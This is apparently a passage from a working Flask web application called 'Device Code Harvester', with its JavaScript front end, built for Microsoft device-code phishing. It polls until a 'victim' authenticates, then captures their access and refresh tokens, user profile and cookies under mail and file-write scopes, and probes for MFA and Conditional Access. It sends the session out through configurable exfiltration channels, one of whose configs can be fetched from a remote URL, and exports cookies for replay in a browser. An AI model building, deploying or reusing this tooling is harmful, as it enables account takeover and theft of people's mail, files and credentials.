    const ts = new Date().toLocaleTimeString();
    line.textContent = `[${ts}] ${message}`;
    logs.appendChild(line);
    logs.scrollTop = logs.scrollHeight;
}

function setStatus(message, type='info') {
    const el = document.getElementById('statusArea');
    el.className = 'status-bar ' + type;
    el.textContent = message;
    el.classList.remove('hidden');
}

function toggleCollapse(header) {
    const body = header.nextElementSibling;
    if (body.classList.contains('hidden')) {
        body.classList.remove('hidden');
        header.querySelector('strong').innerHTML = '&#9660; ' + header.querySelector('strong').textContent.slice(2);
    } else {
        body.classList.add('hidden');
        header.querySelector('strong').innerHTML = '&#9654; ' + header.querySelector('strong').textContent.slice(2);
    }
}

function copyText(elementId) {
    const el = document.getElementById(elementId);
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        addLog('Copied to clipboard', 'ok');
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
    });
}

function updateCaptureStatus(data) {
    const el = document.getElementById('captureStatus');
    if (data.status === 'device_code_ready') {
        el.innerHTML = '<span class="success">&#9679; Device code obtained. Waiting for victim...</span>';
        document.getElementById('deviceCodeArea').classList.remove('hidden');
        document.getElementById('verificationUri').textContent = data.verification_uri;
        document.getElementById('userCode').textContent = data.user_code;
    } else if (data.status === 'polling') {
        el.innerHTML = `<span class="info">&#9679; Polling for authentication... (interval: ${data.interval}s)</span>`;
    } else if (data.status === 'token_obtained') {
        el.innerHTML = '<span class="success">&#9679; Token captured successfully!</span>';
        document.getElementById('startBtn').disabled = false;
    } else if (data.status === 'error') {
        el.innerHTML = '<span class="error">&#9679; Error: ' + (data.message || 'Unknown') + '</span>';
        document.getElementById('startBtn').disabled = false;
    }
}

function displayResults(data) {
    // Tokens
    const tokens = data.session.tokens;
    let tokenHtml = '';
    for (const [key, val] of Object.entries(tokens)) {
        const displayVal = val && val.length > 80 ? val.substring(0, 80) + '...' : (val || 'N/A');
        tokenHtml += `<div class="flex" style="margin-bottom:5px;"><strong style="min-width:140px;color:#8b949e;">${key}:</strong><code style="word-break:break-all;flex:1;">${JSON.stringify(displayVal)}</code></div>`;
    }
    document.getElementById('tokensContent').innerHTML = tokenHtml;

    // User
    const user = data.session.user;
    let userHtml = '';
    for (const [key, val] of Object.entries(user)) {
        if (val) {
            userHtml += `<div class="flex" style="margin-bottom:3px;"><strong style="min-width:140px;color:#8b949e;">${key}:</strong><span>${val}</span></div>`;
        }
    }
    document.getElementById('userContent').innerHTML = userHtml || '<p class="info">No user info available</p>';

    // Cookies
    document.getElementById('cookieCount').textContent = data.session.cookie_count;
    if (data.session.cookies && data.session.cookies.length > 0) {
        let cookieHtml = '<div class="code-block" style="max-height:200px;">';
        data.session.cookies.forEach(c => {
            cookieHtml += `<div>${c.domain} | ${c.name}: ${c.value.substring(0, 40)}...</div>`;
        });
        cookieHtml += '</div>';
        document.getElementById('cookiesContent').innerHTML = cookieHtml;
    } else {
        document.getElementById('cookiesContent').innerHTML = '<p class="warning">No cookies extracted</p>';
    }

    // Conditional Access
    if (data.ca_analysis) {
        let caHtml = '';
        for (const indicator of data.ca_analysis) {
            caHtml += `<div class="flex" style="margin-bottom:5px;"><span class="badge ${indicator.includes('MFA') || indicator.includes('CAE') ? 'badge-yellow' : 'badge-green'}">!</span> ${indicator}</div>`;
        }
        document.getElementById('caContent').innerHTML = caHtml || '<p class="info">No Conditional Access indicators found</p>';
    }

    // Exfil results
    if (data.exfil_results) {
        let exfilHtml = '';
        for (const [channel, ok] of Object.entries(data.exfil_results)) {
            const cls = ok ? 'badge-green' : 'badge-red';
            const label = ok ? 'Success' : 'Failed';
            exfilHtml += `<div class="flex" style="margin-bottom:5px;"><span class="badge ${cls}">${label}</span> ${channel}</div>`;
        }
        document.getElementById('exfilContent').innerHTML = exfilHtml || '<p class="info">No exfil channels configured</p>';
    }

    // Full session
    const fullHtml = JSON.stringify(data.session, null, 2);
    document.getElementById('fullContent').textContent = fullHtml;
    window.fullSessionData = data.session;

    // Show results card
    document.getElementById('resultsCard').classList.remove('hidden');
    document.getElementById('resultsCard').scrollIntoView({ behavior: 'smooth' });
}

async function startCapture() {
    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.textContent = 'Capturing...';

    // Reset UI
    document.getElementById('captureCard').classList.remove('hidden');
    document.getElementById('resultsCard').classList.add('hidden');
    document.getElementById('deviceCodeArea').classList.add('hidden');
    document.getElementById('logs').innerHTML = '';
    document.getElementById('captureStatus').innerHTML = 'Initializing...';
    setStatus('Capture in progress', 'active');

    const payload = {
        client_id: document.getElementById('clientId').value,
        tenant: document.getElementById('tenant').value,
        scope: document.getElementById('scope').value,
        max_endpoints: parseInt(document.getElementById('maxEndpoints').value) || 4,
        refresh: document.getElementById('refreshToken').checked,
        detect_ca: document.getElementById('detectCA').checked,
    };

    if (!payload.client_id) {
        setStatus('Client ID is required', 'error');
        btn.disabled = false;
        btn.textContent = 'Start Capture';
        return;
    }

    try {
        // Step 1: Get device code
        addLog('Requesting device code...', 'info');
        let resp = await fetch('/api/device-code', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        let data = await resp.json();

        if (!resp.ok) {
            setStatus('Error: ' + (data.error || 'Unknown'), 'error');
            addLog('Failed: ' + (data.error || 'Unknown'), 'err');
            btn.disabled = false;
            btn.textContent = 'Start Capture';
            return;
        }

        addLog(`Device code obtained: ${data.user_code}`, 'ok');
        updateCaptureStatus({
            status: 'device_code_ready',
            verification_uri: data.verification_uri,
            user_code: data.user_code
        });

        // Step 2: Start polling via server-sent events
        addLog('Starting poll loop...', 'info');
        const pollResp = await fetch('/api/poll', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                device_code: data.device_code,
                client_id: payload.client_id,
                tenant: payload.tenant,
                scope: payload.scope,
            })
        });
        const pollData = await pollResp.json();

        if (!pollResp.ok) {
            setStatus('Polling error: ' + (pollData.error || 'Unknown'), 'error');
            addLog('Polling failed: ' + (pollData.error || 'Unknown'), 'err');
            btn.disabled = false;
            btn.textContent = 'Start Capture';
            return;
        }

        addLog('Token obtained! Proceeding with extraction...', 'ok');
        updateCaptureStatus({ status: 'token_obtained' });

        // Step 3: Extract and exfil
        addLog('Fetching user info...', 'info');
        addLog('Extracting cookies...', 'info');
        addLog('Exfiltrating payload...', 'info');

        const extractResp = await fetch('/api/extract', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                token_data: pollData.token_data,
                client_id: payload.client_id,
                tenant: payload.tenant,
                max_endpoints: payload.max_endpoints,
                refresh: payload.refresh,
                detect_ca: payload.detect_ca,
            })
        });
        const extractData = await extractResp.json();

        if (!extractResp.ok) {
            setStatus('Extraction error: ' + (extractData.error || 'Unknown'), 'error');
            addLog('Extraction failed: ' + (extractData.error || 'Unknown'), 'err');
            btn.disabled = false;
            btn.textContent = 'Start Capture';
            return;
        }

        addLog('Capture complete!', 'ok');
        setStatus('Capture complete! Review results below.', 'success');

        // Display results
        displayResults(extractData);
        addLog(`Victim: ${extractData.session.user.upn || extractData.session.user.email || 'Unknown'}`, 'ok');
        addLog(`Cookies: ${extractData.session.cookie_count}`, 'info');
        if (extractData.exfil_results) {
            const ok = Object.values(extractData.exfil_results).filter(v => v).length;
            addLog(`Exfil: ${ok}/${Object.keys(extractData.exfil_results).length} channels OK`, 'info');
        }

    } catch (e) {
        setStatus('Error: ' + e.message, 'error');
        addLog('Exception: ' + e.message, 'err');
    }

    btn.disabled = false;
    btn.textContent = 'Start Capture';
}

function clearOutput() {
    document.getElementById('logs').innerHTML = '';
    document.getElementById('statusArea').classList.add('hidden');
    document.getElementById('resultsCard').classList.add('hidden');
    document.getElementById('captureCard').classList.add('hidden');
}

function exportCookiesNetscape() {
    if (!window.fullSessionData || !window.fullSessionData.cookies) return;
    let lines = ["# Netscape HTTP Cookie File", "# Generated by Device Code Harvester"];
    for (const c of window.fullSessionData.cookies) {
        const domain = c.domain || '.microsoftonline.com';
        const domainFlag = domain.startsWith('.') ? 'TRUE' : 'FALSE';
        const secure = c.secure ? 'TRUE' : 'FALSE';
        const expiry = c.expirationDate ? Math.floor(c.expirationDate) : '0';
        lines.push(`${domain}\t${domainFlag}\t${c.path || '/'}\t${secure}\t${expiry}\t${c.name}\t${c.value}`);
    }
    downloadFile(lines.join('\n'), 'cookies_netscape.txt', 'text/plain');
}

function exportCookiesJSON() {
    if (!window.fullSessionData || !window.fullSessionData.cookies) return;
    downloadFile(JSON.stringify(window.fullSessionData.cookies, null, 2), 'cookies_editthiscookie.json', 'application/json');
}

function downloadSession() {
    if (!window.fullSessionData) return;
    downloadFile(JSON.stringify(window.fullSessionData, null, 2), 'session_full.json', 'application/json');
}

function copyFullSession() {
    if (!window.fullSessionData) return;
    navigator.clipboard.writeText(JSON.stringify(window.fullSessionData, null, 2));
    addLog('Full session copied to clipboard', 'ok');
}

function downloadFile(content, filename, mimeType) {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
}
</script>
</body>
</html>
'''

# ===================== FLASK API ROUTES =====================
@app.route('/')
@requires_auth
def index():
    return render_template_string(HTML_TEMPLATE, client_id=os.environ.get('CLIENT_ID', ''))

@app.route('/health')
def health():
    return jsonify({"status": "ok", "timestamp": datetime.now(timezone.utc).isoformat()})

@app.route('/api/device-code', methods=['POST'])
@requires_auth
def api_device_code():
    """Step 1: Get a device code from Microsoft."""
    data = request.get_json()
    client_id = data.get('client_id', '')
    tenant = data.get('tenant', 'common')
    scope_str = data.get('scope', 'openid offline_access profile')

    if not client_id:
        return jsonify({"error": "client_id is required"}), 400

    scopes = scope_str.split()
    stealth = StealthEngine()
    harvester = TokenHarvester(client_id=client_id, tenant=tenant,
                                scopes=scopes, stealth=stealth)

    try:
        dev_code = harvester.get_device_code()
        # Store minimal info for this session – we don't keep full harvester in memory
        # but we can store the device_code and other params if needed for later steps.
        # Since each step is independent, we rely on client passing back the device_code.
        return jsonify({
            'user_code': dev_code.get('user_code'),
            'verification_uri': dev_code.get('verification_uri'),
            'device_code': dev_code.get('device_code'),
            'interval': dev_code.get('interval', 5),
        })
    except Exception as e:
        logger.error(f"Device code error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/poll', methods=['POST'])
@requires_auth
def api_poll():
    """Step 2: Poll for token until the victim authenticates."""
    data = request.get_json()
    device_code = data.get('device_code')
    client_id = data.get('client_id')
    tenant = data.get('tenant', 'common')
    scope_str = data.get('scope', 'openid offline_access profile')

    if not all([device_code, client_id]):
        return jsonify({"error": "device_code and client_id are required"}), 400

    scopes = scope_str.split()
    stealth = StealthEngine()
    harvester = TokenHarvester(client_id=client_id, tenant=tenant,
                                scopes=scopes, stealth=stealth)

    try:
        token_data = harvester.poll_for_token(device_code)
        return jsonify({
            "token_data": token_data,
            "status": "success",
        })
    except Exception as e:
        logger.error(f"Poll error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/extract', methods=['POST'])
@requires_auth
def api_extract():
    """Step 3: Extract user info, cookies, run exfil."""
    data = request.get_json()
    token_data = data.get('token_data', {})
    client_id = data.get('client_id')
    tenant = data.get('tenant', 'common')
    max_endpoints = data.get('max_endpoints', 4)
    do_refresh = data.get('refresh', True)
    do_ca = data.get('detect_ca', True)

    if not token_data or not client_id:
        return jsonify({"error": "token_data and client_id required"}), 400

    scopes = data.get('scope', '').split() or [
        "https://graph.microsoft.com/Mail.Read",
        "https://graph.microsoft.com/Files.ReadWrite.All",
        "https://graph.microsoft.com/User.Read",
        "openid", "offline_access", "profile",
    ]

    stealth = StealthEngine()
    harvester = TokenHarvester(client_id=client_id, tenant=tenant,
                                scopes=scopes, stealth=stealth)
    harvester.token_data = token_data

    # Optionally refresh
    if do_refresh and token_data.get('refresh_token'):
        try:
            refreshed = harvester.refresh_token(token_data['refresh_token'])
            if refreshed:
                logger.info("Token refreshed successfully")
        except Exception as e:
            logger.warning(f"Refresh failed (continuing with original): {e}")

    # Fetch user info
    user_info = harvester.fetch_user_info()
    logger.info(f"User: {user_info.get('userPrincipalName', 'Unknown')}")

    # Extract cookies
    cookies = harvester.extract_cookies(max_endpoints=max_endpoints)

    # Build session payload
    metadata = {
        'operator': os.environ.get('USER', os.environ.get('USERNAME', 'render')),
        'hostname': socket.gethostname(),
        'capture_time': datetime.now(timezone.utc).isoformat(),
    }

    session_payload = build_session_payload(
        token_data=harvester.token_data,
        cookies=cookies,
        user_info=user_info,
        client_id=client_id,
        tenant=tenant,
        metadata=metadata,
    )

    # Conditional Access analysis
    ca_analysis = []
    if do_ca and token_data.get('id_token'):
        id_claims = decode_jwt(token_data['id_token'])
        if id_claims:
            if id_claims.get('amr'):
                if 'mfa' in id_claims['amr']:
                    ca_analysis.append("MFA was active during authentication")
                ca_analysis.append(f"Auth methods: {id_claims['amr']}")
            if id_claims.get('acrs'):
                ca_analysis.append(f"Conditional Access claims: {id_claims['acrs']}")
            if id_claims.get('cae'):
                ca_analysis.append("Continuous Access Evaluation (CAE) is active")
            if id_claims.get('device_id'):
                ca_analysis.append("Device ID present - device may be managed")

    # Exfiltration
    exfil_results = {}
    exfil_config = os.environ.get('EXFIL_CONFIG')
    encryption_key = os.environ.get('ENCRYPTION_KEY')

    if exfil_config:
        try:
            # Download or read exfil config
            if exfil_config.startswith('http'):
                resp = requests.get(exfil_config, timeout=10)
                config_data = resp.json()
            elif os.path.exists(exfil_config):
                with open(exfil_config) as f:
                    config_data = json.load(f)
            else:
                config_data = json.loads(exfil_config)

            exfil_mgr = ExfilManager(config_data, encryption_key=encryption_key)
            exfil_results = exfil_mgr.exfiltrate(session_payload)
        except Exception as e:
            logger.error(f"Exfil error: {e}")
            exfil_results = {'error': str(e)}

    # Also save locally if EXFIL_OUTPUT_DIR is set
    output_dir = os.environ.get('EXFIL_OUTPUT_DIR')
    if output_dir:
        try:
            os.makedirs(output_dir, exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            fname = os.path.join(output_dir, f"session_{ts}.json")
            with open(fname, 'w') as f:
                json.dump(session_payload, f, indent=2, default=str)
            logger.info(f"Session saved locally: {fname}")
        except Exception as e:
            logger.warning(f"Local save failed: {e}")

    return jsonify({
        'session': session_payload,
        'ca_analysis': ca_analysis,
        'exfil_results': exfil_results,
        'status': 'success',
    })

# ===================== ENTRY POINT =====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true', 'yes')
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=debug)
